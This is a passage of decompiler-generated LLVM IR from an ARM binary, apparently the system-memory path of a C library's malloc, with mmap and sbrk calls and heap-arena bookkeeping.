bb148:                                            ; preds = %dec_label_pc_10e70
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v8_10e90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v8_10e90, i32* %r3.global-to-local, align 4
  %v4_10e94 = load i32, i32* %r1.global-to-local, align 4
  %v6_10e94 = add i32 %v8_10e90, 48
  %v7_10e94 = inttoptr i32 %v6_10e94 to i32*
  store i32 %v4_10e94, i32* %v7_10e94, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_10e70, %bb148
  %v0_10e98 = load i32, i32* @sl, align 4
  %v1_10e98 = or i32 %v0_10e98, 1
  store i32 %v1_10e98, i32* %r2.global-to-local, align 4
  %v0_10e9c = load i32, i32* %ip.global-to-local, align 4
  %v1_10e9c = or i32 %v0_10e9c, 1
  store i32 %v1_10e9c, i32* %r3.global-to-local, align 4
  %v0_10ea0 = load i32, i32* @lr, align 4
  %v1_10ea0 = add i32 %v0_10ea0, 8
  store i32 %v1_10ea0, i32* %r4.global-to-local, align 4
  %v2_10ea4 = add i32 %v0_10ea0, 4
  %v3_10ea4 = inttoptr i32 %v2_10ea4 to i32*
  store i32 %v1_10e98, i32* %v3_10ea4, align 4
  %v0_10ea8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10ea8 = load i32, i32* %r1.global-to-local, align 4
  %v3_10ea8 = add i32 %v1_10ea8, %v0_10ea8
  %v4_10ea8 = inttoptr i32 %v3_10ea8 to i32*
  store i32 %v0_10ea8, i32* %v4_10ea8, align 4
  %v0_10eac = load i32, i32* %r3.global-to-local, align 4
  %v1_10eac = load i32, i32* %r1.global-to-local, align 4
  %v2_10eac = add i32 %v1_10eac, 4
  %v3_10eac = inttoptr i32 %v2_10eac to i32*
  store i32 %v0_10eac, i32* %v3_10eac, align 4
  br label %dec_label_pc_11308

dec_label_pc_10eb4.loopexit:                      ; preds = %dec_label_pc_10dd4
  br label %dec_label_pc_10eb4

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10eb4.loopexit, %dec_label_pc_10ac8, %dec_label_pc_10ad0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %ip.global-to-local, align 4
  %v4_10ebc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_10ebc, i32* @r0, align 4
  %v1_10ec0 = add i32 %v4_10ebc, 44
  %v2_10ec0 = inttoptr i32 %v1_10ec0 to i32*
  %v3_10ec0 = load i32, i32* %v2_10ec0, align 4
  store i32 %v3_10ec0, i32* %ip.global-to-local, align 4
  %v1_10ec4 = add i32 %v3_10ec0, 4
  %v2_10ec4 = inttoptr i32 %v1_10ec4 to i32*
  %v3_10ec4 = load i32, i32* %v2_10ec4, align 4
  %v0_10ec8 = load i32, i32* @sl, align 4
  %v1_10ec8 = add i32 %v0_10ec8, 16
  store i32 %v1_10ec8, i32* %r1.global-to-local, align 4
  %v1_10ecc = and i32 %v3_10ec4, -4
  store i32 %v1_10ecc, i32* %r3.global-to-local, align 4
  %v3_10ed0 = icmp ult i32 %v1_10ecc, %v1_10ec8
  br i1 %v3_10ed0, label %dec_label_pc_10f00, label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10eb4
  %v2_10edc = sub i32 %v1_10ecc, %v0_10ec8
  %v2_10ee0 = add i32 %v0_10ec8, %v3_10ec0
  store i32 %v2_10ee0, i32* %r1.global-to-local, align 4
  %v1_10ee4 = or i32 %v2_10edc, 1
  store i32 %v1_10ee4, i32* %r3.global-to-local, align 4
  %v1_10ee8 = or i32 %v0_10ec8, 1
  store i32 %v1_10ee8, i32* %r2.global-to-local, align 4
  %v1_10eec = add i32 %v3_10ec0, 8
  store i32 %v1_10eec, i32* %r4.global-to-local, align 4
  store i32 %v1_10ee8, i32* %v2_10ec4, align 4
  %v0_10ef4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10ef4 = load i32, i32* @r0, align 4
  %v2_10ef4 = add i32 %v1_10ef4, 44
  %v3_10ef4 = inttoptr i32 %v2_10ef4 to i32*
  store i32 %v0_10ef4, i32* %v3_10ef4, align 4
  %v0_10ef8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10ef8 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ef8 = add i32 %v1_10ef8, 4
  %v3_10ef8 = inttoptr i32 %v2_10ef8 to i32*
  store i32 %v0_10ef8, i32* %v3_10ef8, align 4
  br label %dec_label_pc_11308

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10eb4
  %v1_10f00 = inttoptr i32 %v4_10ebc to i32*
  %v2_10f00 = load i32, i32* %v1_10f00, align 4
  store i32 %v2_10f00, i32* %r3.global-to-local, align 4
  %v1_10f04 = and i32 %v2_10f00, 2
  store i32 %v1_10f04, i32* %ip.global-to-local, align 4
  %v2_10f04 = icmp eq i32 %v1_10f04, 0
  %v1_10f08 = add i32 %v4_10ebc, 860
  %v2_10f08 = inttoptr i32 %v1_10f08 to i32*
  %v3_10f08 = load i32, i32* %v2_10f08, align 4
  store i32 %v3_10f08, i32* %r1.global-to-local, align 4
  br i1 %v2_10f04, label %dec_label_pc_10f20, label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10f00
  %v0_10f10 = call i32 @__malloc_consolidate()
  %v0_10f14 = load i32, i32* @sl, align 4
  %v1_10f14 = add i32 %v0_10f14, -7
  store i32 %v1_10f14, i32* @r0, align 4
  %v0_10f18 = call i32 @malloc()
  store i32 %v0_10f18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11304

dec_label_pc_10f20:                               ; preds = %dec_label_pc_10f00
  %v1_10f20 = add i32 %v4_10ebc, 844
  %v2_10f20 = inttoptr i32 %v1_10f20 to i32*
  %v3_10f20 = load i32, i32* %v2_10f20, align 4
  store i32 %v3_10f20, i32* %r3.global-to-local, align 4
  %v3_10f24 = icmp ult i32 %v0_10ec8, %v3_10f20
  %v1_10f28 = add i32 %v3_10f08, -1
  store i32 %v1_10f28, i32* %sb.global-to-local, align 4
  br i1 %v3_10f24, label %dec_label_pc_10ffc, label %dec_label_pc_10f30

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10f20
  %v1_10f30 = add i32 %v4_10ebc, 852
  %v2_10f30 = inttoptr i32 %v1_10f30 to i32*
  %v3_10f30 = load i32, i32* %v2_10f30, align 4
  store i32 %v3_10f30, i32* %r2.global-to-local, align 4
  %v1_10f34 = add i32 %v4_10ebc, 848
  %v2_10f34 = inttoptr i32 %v1_10f34 to i32*
  %v3_10f34 = load i32, i32* %v2_10f34, align 4
  store i32 %v3_10f34, i32* %r3.global-to-local, align 4
  %v6_10f3c = icmp slt i32 %v3_10f34, %v3_10f30
  br i1 %v6_10f3c, label %dec_label_pc_10f40, label %dec_label_pc_10ffc

dec_label_pc_10f40:                               ; preds = %dec_label_pc_10f30
  %v1_10f40 = add i32 %v0_10ec8, 10
  %v2_10f44 = add i32 %v1_10f40, %v3_10f08
  store i32 %v2_10f44, i32* %r3.global-to-local, align 4
  %v2_10f48 = sub i32 0, %v3_10f08
  %v3_10f48 = and i32 %v2_10f44, %v2_10f48
  store i32 %v3_10f48, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_10f48, %v0_10ec8
  br i1 %tmp214, label %dec_label_pc_10f54, label %dec_label_pc_10ffc

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f40
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_10f48, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_10f6c = call i32 @mmap(i32 0, i32 %v3_10f48, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_10f6c, i32* %r0.global-to-local, align 4
  %v7_10f70 = icmp eq i32 %v6_10f6c, -1
  br i1 %v7_10f70, label %dec_label_pc_10f54.dec_label_pc_10ffc_crit_edge, label %dec_label_pc_10f78

dec_label_pc_10f54.dec_label_pc_10ffc_crit_edge:  ; preds = %dec_label_pc_10f54
  %v1_11020.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_10ffc

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f54
  %v1_10f78 = urem i32 %v6_10f6c, 8
  store i32 %v1_10f78, i32* %r2.global-to-local, align 4
  %v2_10f78 = icmp eq i32 %v1_10f78, 0
  br i1 %v2_10f78, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_10f78
  %v2_10f7c = sub nsw i32 8, %v1_10f78
  store i32 %v2_10f7c, i32* %r3.global-to-local, align 4
  %v2_10f80 = load i32, i32* @r4, align 4
  %v3_10f80 = sub i32 %v2_10f80, %v2_10f7c
  %v3_10f84 = add i32 %v2_10f7c, %v6_10f6c
  store i32 %v3_10f84, i32* %lr.global-to-local, align 4
  %v2_10f8c = or i32 %v3_10f80, 2
  store i32 %v2_10f8c, i32* %r2.global-to-local, align 4
  %v5_10f94 = inttoptr i32 %v3_10f84 to i32*
  store i32 %v2_10f7c, i32* %v5_10f94, align 4
  %v1_10f98 = load i32, i32* %r2.global-to-local, align 4
  %v2_10f98 = load i32, i32* %lr.global-to-local, align 4
  %v3_10f98 = add i32 %v2_10f98, 4
  %v4_10f98 = inttoptr i32 %v3_10f98 to i32*
  store i32 %v1_10f98, i32* %v4_10f98, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_10f78
  store i32 %v6_10f6c, i32* %lr.global-to-local, align 4
  %v1_10f9050 = load i32, i32* @r4, align 4
  %v2_10f9051 = or i32 %v1_10f9050, 2
  store i32 %v2_10f9051, i32* %r3.global-to-local, align 4
  %v3_10f9c = inttoptr i32 %v6_10f6c to i32*
  store i32 0, i32* %v3_10f9c, align 4
  %v1_10fa0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10fa0 = load i32, i32* %lr.global-to-local, align 4
  %v3_10fa0 = add i32 %v2_10fa0, 4
  %v4_10fa0 = inttoptr i32 %v3_10fa0 to i32*
  store i32 %v1_10fa0, i32* %v4_10fa0, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_10fac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_10fac, i32* %ip.global-to-local, align 4
  %v1_10fb0 = add i32 %v4_10fac, 848
  %v2_10fb0 = inttoptr i32 %v1_10fb0 to i32*
  %v3_10fb0 = load i32, i32* %v2_10fb0, align 4
  store i32 %v3_10fb0, i32* %r3.global-to-local, align 4
  %v1_10fb4 = add i32 %v4_10fac, 856
  %v2_10fb4 = inttoptr i32 %v1_10fb4 to i32*
  %v3_10fb4 = load i32, i32* %v2_10fb4, align 4
  store i32 %v3_10fb4, i32* %r2.global-to-local, align 4
  %v1_10fb8 = add i32 %v3_10fb0, 1
  store i32 %v1_10fb8, i32* %r3.global-to-local, align 4
  %v7_10fc0 = icmp sgt i32 %v1_10fb8, %v3_10fb4
  br i1 %v7_10fc0, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_10fb8, i32* %v2_10fb4, align 4
  %v0_10fc4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10fc4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_10fc4 = phi i32 [ %v4_10fac, %.thread30 ], [ %v1_10fc4.pre, %bb150 ]
  %v0_10fc4 = phi i32 [ %v1_10fb8, %.thread30 ], [ %v0_10fc4.pre, %bb150 ]
  %v2_10fc4 = add i32 %v1_10fc4, 848
  %v3_10fc4 = inttoptr i32 %v2_10fc4 to i32*
  store i32 %v0_10fc4, i32* %v3_10fc4, align 4
  %v0_10fc8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10fc8 = add i32 %v0_10fc8, 868
  %v2_10fc8 = inttoptr i32 %v1_10fc8 to i32*
  %v3_10fc8 = load i32, i32* %v2_10fc8, align 4
  store i32 %v3_10fc8, i32* %r3.global-to-local, align 4
  %v1_10fcc = add i32 %v0_10fc8, 880
  %v2_10fcc = inttoptr i32 %v1_10fcc to i32*
  %v3_10fcc = load i32, i32* %v2_10fcc, align 4
  store i32 %v3_10fcc, i32* %r2.global-to-local, align 4
  %v0_10fd0 = load i32, i32* @r4, align 4
  %v2_10fd0 = add i32 %v0_10fd0, %v3_10fc8
  store i32 %v2_10fd0, i32* %r1.global-to-local, align 4
  %v1_10fd4 = add i32 %v0_10fc8, 872
  %v2_10fd4 = inttoptr i32 %v1_10fd4 to i32*
  %v3_10fd4 = load i32, i32* %v2_10fd4, align 4
  store i32 %v3_10fd4, i32* %r3.global-to-local, align 4
  %v1_10fdc = add i32 %v0_10fc8, 884
  %v2_10fdc = inttoptr i32 %v1_10fdc to i32*
  %v3_10fdc = load i32, i32* %v2_10fdc, align 4
  store i32 %v3_10fdc, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_10fd0, %v3_10fcc
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_10fd0, i32* %v2_10fcc, align 4
  %v0_10fe4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10fe4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_10fe4 = phi i32 [ %v0_10fc8, %bb151 ], [ %v1_10fe4.pre, %bb152 ]
  %v0_10fe4 = phi i32 [ %v2_10fd0, %bb151 ], [ %v0_10fe4.pre, %bb152 ]
  %v2_10fe4 = add i32 %v1_10fe4, 868
  %v3_10fe4 = inttoptr i32 %v2_10fe4 to i32*
  store i32 %v0_10fe4, i32* %v3_10fe4, align 4
  %v0_10fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_10fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10fe8 = add i32 %v1_10fe8, %v0_10fe8
  store i32 %v2_10fe8, i32* %r1.global-to-local, align 4
  %v1_10fec = load i32, i32* %r2.global-to-local, align 4
  %v0_10ff0 = load i32, i32* %lr.global-to-local, align 4
  %v1_10ff0 = add i32 %v0_10ff0, 8
  store i32 %v1_10ff0, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_10fe8, %v1_10fec
  br i1 %tmp216, label %bb154, label %dec_label_pc_11304

bb154:                                            ; preds = %bb153
  %v5_10ff4 = load i32, i32* %ip.global-to-local, align 4
  %v6_10ff4 = add i32 %v5_10ff4, 884
  %v7_10ff4 = inttoptr i32 %v6_10ff4 to i32*
  store i32 %v2_10fe8, i32* %v7_10ff4, align 4
  br label %dec_label_pc_11304

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10f40, %dec_label_pc_10f20, %dec_label_pc_10f54.dec_label_pc_10ffc_crit_edge, %dec_label_pc_10f30
  %v1_11020 = phi i32 [ %v1_11020.pre, %dec_label_pc_10f54.dec_label_pc_10ffc_crit_edge ], [ %v0_10ec8, %dec_label_pc_10f30 ], [ %v0_10ec8, %dec_label_pc_10f20 ], [ %v0_10ec8, %dec_label_pc_10f40 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %ip.global-to-local, align 4
  %v4_11004 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_11004, i32* %r3.global-to-local, align 4
  %v1_11008 = add i32 %v4_11004, 44
  %v2_11008 = inttoptr i32 %v1_11008 to i32*
  %v3_11008 = load i32, i32* %v2_11008, align 4
  store i32 %v3_11008, i32* %r0.global-to-local, align 4
  %v1_1100c = add i32 %v4_11004, 864
  %v2_1100c = inttoptr i32 %v1_1100c to i32*
  %v3_1100c = load i32, i32* %v2_1100c, align 4
  store i32 %v3_1100c, i32* %r2.global-to-local, align 4
  %v1_11010 = add i32 %v4_11004, 840
  %v2_11010 = inttoptr i32 %v1_11010 to i32*
  %v3_11010 = load i32, i32* %v2_11010, align 4
  store i32 %v3_11010, i32* %r3.global-to-local, align 4
  %v1_11014 = add i32 %v3_11008, 4
  %v2_11014 = inttoptr i32 %v1_11014 to i32*
  %v3_11014 = load i32, i32* %v2_11014, align 4
  store i32 %v3_11014, i32* %r1.global-to-local, align 4
  %v1_1101c = urem i32 %v3_1100c, 2
  %v2_1101c = icmp eq i32 %v1_1101c, 0
  %v1_11018 = add i32 %v1_11020, 16
  %v2_11020 = add i32 %v1_11018, %v3_11010
  store i32 %v2_11020, i32* %r3.global-to-local, align 4
  %v1_11024 = and i32 %v3_11014, -4
  store i32 %v1_11024, i32* @r8, align 4
  br i1 %v2_1101c, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_10ffc
  %v3_11028 = sub i32 %v2_11020, %v1_11024
  store i32 %v3_11028, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_10ffc, %bb155
  %v0_1102c = phi i32 [ %v2_11020, %dec_label_pc_10ffc ], [ %v3_11028, %bb155 ]
  %v1_1102c = load i32, i32* %sb.global-to-local, align 4
  %v2_1102c = add i32 %v1_1102c, %v0_1102c
  store i32 %v2_1102c, i32* %r3.global-to-local, align 4
  %v1_11030 = sub i32 -1, %v1_1102c
  store i32 %v1_11030, i32* %fp.global-to-local, align 4
  %v2_11034 = and i32 %v2_1102c, %v1_11030
  store i32 %v2_11034, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_11034, 1
  br i1 %tmp157, label %dec_label_pc_11058, label %dec_label_pc_11044

dec_label_pc_11044:                               ; preds = %bb156
  store i32 %v2_11034, i32* %r0.global-to-local, align 4
  %v1_11048 = call i32 @__GI_sbrk(i32 %v2_11034)
  store i32 %v1_11048, i32* %r0.global-to-local, align 4
  %v3_1104c = icmp eq i32 %v1_11048, -1
  store i32 %v1_11048, i32* @r4, align 4
  br i1 %v3_1104c, label %dec_label_pc_11058, label %dec_label_pc_110c4

dec_label_pc_11058:                               ; preds = %dec_label_pc_11044, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r1.global-to-local, align 4
  %v4_11060 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_11060, i32* %r6.global-to-local, align 4
  %v1_11064 = add i32 %v4_11060, 864
  %v2_11064 = inttoptr i32 %v1_11064 to i32*
  %v3_11064 = load i32, i32* %v2_11064, align 4
  store i32 %v3_11064, i32* %r3.global-to-local, align 4
  %v1_11068 = urem i32 %v3_11064, 2
  %v2_11068 = icmp eq i32 %v1_11068, 0
  br i1 %v2_11068, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_11058
  %v1_1106c = load i32, i32* @r8, align 4
  %v2_1106c = load i32, i32* %sb.global-to-local, align 4
  %v3_1106c = add i32 %v2_1106c, %v1_1106c
  %v2_11070 = load i32, i32* @r5, align 4
  %v3_11070 = add i32 %v3_1106c, %v2_11070
  store i32 %v3_11070, i32* %r3.global-to-local, align 4
  %v2_11074 = load i32, i32* %fp.global-to-local, align 4
  %v3_11074 = and i32 %v2_11074, %v3_11070
  store i32 %v3_11074, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_11058
  %v0_11078.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_11078 = phi i32 [ %v0_11078.pr, %.thread32thread-pre-split ], [ %v3_11074, %bb158 ]
  %v2_11078 = icmp ugt i32 %v0_11078, 1048575
  br i1 %v2_11078, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_11090 = phi i32 [ %v0_11078, %.thread32 ], [ 1048576, %bb159 ]
  %v1_11080 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_11090, %v1_11080
  br i1 %tmp217, label %dec_label_pc_11088, label %dec_label_pc_112ec

dec_label_pc_11088:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_11090, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_110a4 = call i32 @mmap(i32 0, i32 %v0_11090, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_110a4, i32* %r0.global-to-local, align 4
  %v3_110a8 = icmp eq i32 %v6_110a4, -1
  %v8_110a8 = icmp eq i32 %v6_110a4, -1
  store i32 %v6_110a4, i32* @r4, align 4
  br i1 %v8_110a8, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_11088
  %v1_110b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_110b0 = add i32 %v1_110b0, 864
  %v3_110b0 = inttoptr i32 %v2_110b0 to i32*
  %v4_110b0 = load i32, i32* %v3_110b0, align 4
  %v2_110b4 = load i32, i32* @r5, align 4
  %v3_110b4 = add i32 %v2_110b4, %v6_110a4
  store i32 %v3_110b4, i32* %r0.global-to-local, align 4
  %v2_110b8 = and i32 %v4_110b0, -2
  store i32 %v2_110b8, i32* %r3.global-to-local, align 4
  store i32 %v2_110b8, i32* %v3_110b0, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_11088, %bb161
  br i1 %v3_110a8, label %dec_label_pc_110c4, label %dec_label_pc_110c8

dec_label_pc_110c4:                               ; preds = %.thread35, %dec_label_pc_11044
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_110c8

dec_label_pc_110c8:                               ; preds = %.thread35, %dec_label_pc_110c4
  %v0_110c8 = load i32, i32* @r4, align 4
  %v7_110c8 = icmp eq i32 %v0_110c8, -1
  br i1 %v7_110c8, label %dec_label_pc_112ec, label %dec_label_pc_110d0

dec_label_pc_110d0:                               ; preds = %dec_label_pc_110c8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v4_110d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_110d8, i32* %ip.global-to-local, align 4
  store i32 %v3_11008, i32* %r2.global-to-local, align 4
  %v1_110e0 = add i32 %v4_110d8, 872
  %v2_110e0 = inttoptr i32 %v1_110e0 to i32*
  %v3_110e0 = load i32, i32* %v2_110e0, align 4
  %v1_110e4 = load i32, i32* @r8, align 4
  %v2_110e4 = add i32 %v1_110e4, %v3_11008
  store i32 %v2_110e4, i32* %r1.global-to-local, align 4
  %v0_110e8 = load i32, i32* @r5, align 4
  %v2_110e8 = add i32 %v0_110e8, %v3_110e0
  store i32 %v2_110e8, i32* %r3.global-to-local, align 4
  %v9_110ec = icmp eq i32 %v0_110c8, %v2_110e4
  br i1 %v9_110ec, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_110d0
  store i32 %v2_110e8, i32* %v2_110e0, align 4
  br label %dec_label_pc_11108

bb162:                                            ; preds = %dec_label_pc_110d0
  %v1_110f0 = load i32, i32* %r0.global-to-local, align 4
  %v8_110f0 = icmp eq i32 %v1_110f0, -1
  store i32 %v2_110e8, i32* %v2_110e0, align 4
  br i1 %v8_110f0, label %.thread37, label %dec_label_pc_11108

.thread37:                                        ; preds = %bb162
  %v1_110f8 = load i32, i32* @r5, align 4
  %v2_110f8 = load i32, i32* @r8, align 4
  %v3_110f8 = add i32 %v2_110f8, %v1_110f8
  %v2_110fc = or i32 %v3_110f8, 1
  store i32 %v2_110fc, i32* %r3.global-to-local, align 4
  %v2_11100 = load i32, i32* %r2.global-to-local, align 4
  %v3_11100 = add i32 %v2_11100, 4
  %v4_11100 = inttoptr i32 %v3_11100 to i32*
  store i32 %v2_110fc, i32* %v4_11100, align 4
  br label %dec_label_pc_11280

dec_label_pc_11108:                               ; preds = %bb162, %.thread125
  %v0_1110c.pr = load i32, i32* @r8, align 4
  %v0_11108 = load i32, i32* %ip.global-to-local, align 4
  %v1_11108 = add i32 %v0_11108, 864
  %v2_11108 = inttoptr i32 %v1_11108 to i32*
  %v3_11108 = load i32, i32* %v2_11108, align 4
  store i32 %v3_11108, i32* %r2.global-to-local, align 4
  %v2_1110c = icmp eq i32 %v0_1110c.pr, 0
  br i1 %v2_1110c, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_11108
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_11108
  %v2_11114 = urem i32 %v3_11108, 2
  store i32 %v2_11114, i32* %r3.global-to-local, align 4
  %v2_11118 = icmp eq i32 %v2_11114, 0
  br i1 %v2_11118, label %.thread43, label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %.thread39
  %v0_11120 = load i32, i32* @r4, align 4
  %v1_11120 = load i32, i32* %r1.global-to-local, align 4
  %v3_11120 = icmp ult i32 %v0_11120, %v1_11120
  br i1 %v3_11120, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_11120
  %v2_11124 = and i32 %v3_11108, -2
  store i32 %v2_11124, i32* %r3.global-to-local, align 4
  store i32 %v2_11124, i32* %v2_11108, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_11120, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %ip.global-to-local, align 4
  %v4_11134 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_11134, i32* @r7, align 4
  %v1_11138 = add i32 %v4_11134, 864
  %v2_11138 = inttoptr i32 %v1_11138 to i32*
  %v3_11138 = load i32, i32* %v2_11138, align 4
  store i32 %v3_11138, i32* %r3.global-to-local, align 4
  %v1_1113c = urem i32 %v3_11138, 2
  store i32 %v1_1113c, i32* @r6, align 4
  %v2_1113c = icmp eq i32 %v1_1113c, 0
  br i1 %v2_1113c, label %dec_label_pc_111d0, label %dec_label_pc_11144

dec_label_pc_11144:                               ; preds = %.thread43
  %v0_11144 = load i32, i32* @r8, align 4
  %v2_11144 = icmp eq i32 %v0_11144, 0
  br i1 %v2_11144, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_11144
  %v2_11148 = add i32 %v4_11134, 872
  %v3_11148 = inttoptr i32 %v2_11148 to i32*
  %v4_11148 = load i32, i32* %v3_11148, align 4
  store i32 %v4_11148, i32* %r2.global-to-local, align 4
  %v1_1114c = load i32, i32* %r1.global-to-local, align 4
  %v2_1114c = load i32, i32* @r4, align 4
  %v3_1114c = sub i32 %v2_1114c, %v1_1114c
  %v3_11150 = add i32 %v3_1114c, %v4_11148
  store i32 %v3_11150, i32* %r3.global-to-local, align 4
  store i32 %v3_11150, i32* %v3_11148, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_11144, %bb164
  %v0_11158 = load i32, i32* @r4, align 4
  %v1_11158 = urem i32 %v0_11158, 8
  store i32 %v1_11158, i32* %r3.global-to-local, align 4
  %v2_11158 = icmp eq i32 %v1_11158, 0
  br i1 %v2_11158, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_1115c = sub nsw i32 8, %v1_11158
  store i32 %v2_1115c, i32* %r3.global-to-local, align 4
  %v3_11160 = add i32 %v2_1115c, %v0_11158
  store i32 %v3_11160, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_11168 = phi i32 [ 0, %.thread46 ], [ %v2_1115c, %bb165 ]
  %v1_11164 = load i32, i32* @r5, align 4
  %v2_11164 = add i32 %v1_11164, %v0_11158
  store i32 %v2_11164, i32* @r6, align 4
  %v1_11168 = load i32, i32* @r8, align 4
  %v2_11168 = add i32 %v2_11164, %v0_11168
  %v2_1116c = add i32 %v2_11168, %v1_11168
  store i32 %v2_1116c, i32* %r1.global-to-local, align 4
  %v1_11170 = load i32, i32* %sb.global-to-local, align 4
  %v2_11170 = add i32 %v1_11170, %v2_1116c
  %v1_11174 = load i32, i32* %fp.global-to-local, align 4
  %v2_11174 = and i32 %v1_11174, %v2_11170
  store i32 %v2_11174, i32* %r2.global-to-local, align 4
  %v2_11178 = sub i32 0, %v2_11164
  store i32 %v2_11178, i32* %r3.global-to-local, align 4
  %v2_1117c = sub i32 %v2_11174, %v2_11164
  store i32 %v2_1117c, i32* @r5, align 4
  store i32 %v2_1117c, i32* %r0.global-to-local, align 4
  br i1 %v2_11158, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_11158, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_11188 = call i32 @__GI_sbrk(i32 %v2_1117c)
  store i32 %v1_11188, i32* %r0.global-to-local, align 4
  %v3_1118c = icmp eq i32 %v1_11188, -1
  br i1 %v3_1118c, label %dec_label_pc_11194, label %dec_label_pc_111a4

dec_label_pc_11194:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11198 = call i32 @__GI_sbrk(i32 0)
